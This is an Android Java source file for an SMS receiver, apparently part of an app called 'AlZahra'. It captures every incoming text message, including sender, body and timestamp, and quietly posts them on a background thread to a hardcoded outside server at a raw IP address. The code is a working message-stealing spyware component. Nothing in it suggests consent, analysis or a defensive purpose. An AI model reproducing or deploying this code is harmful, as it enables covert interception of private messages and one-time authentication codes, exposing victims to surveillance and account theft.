package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraSms";
    private static final String SERVER = "http://216.128.156.226:8443";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;
            
            JSONArray arr = new JSONArray();
            for (Object pdu : pdus) {
                SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                JSONObject obj = new JSONObject();
                obj.put("address", msg.getDisplayOriginatingAddress());
                obj.put("body", msg.getDisplayMessageBody());
                obj.put("date", msg.getTimestampMillis());
                obj.put("type", "received");
                arr.put(obj);
            }
            
            sendData(context, arr.toString());
        } catch (Exception e) {
            Log.e(TAG, "SMS error", e);
        }
    }
    
    private void sendData(Context context, String content) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "sms_new");
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
